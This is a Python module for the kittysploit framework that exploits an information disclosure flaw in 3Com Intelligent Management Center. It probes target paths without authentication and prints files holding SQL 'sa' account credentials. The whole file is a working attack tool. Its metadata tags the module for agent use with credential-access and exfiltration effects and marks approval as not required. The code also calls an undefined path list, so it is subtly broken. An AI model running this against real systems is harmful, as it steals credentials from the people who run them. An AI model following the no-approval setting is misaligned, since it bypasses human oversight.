#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""3Com IMC Info Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': '3Com IMC Info Disclosure',
        'description': 'Exploits 3Com Intelligent Management Center information disclosure vulnerability that allows to fetch credentials for SQL sa account',
        'author': ['Richard Brain', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/12680/'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            print_status("Sending request to download sensitive information")
            response = self.http_request(
                method="GET",
                path=self.valid,
            )

            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_status("Reading {}".format(self.valid))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not retrieve response")

        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        for path in self.paths:
            response = self.http_request(
                method="GET",
                path=path,
            )
            if response is None:
                continue

            if any(map(lambda x: x in response.text, ["report.db.server.name", "report.db.server.sa.pass", "report.db.server.user.pass"])):
                self.valid = path
                return True  # target is vulnerable

        return False  # target not vulnerable
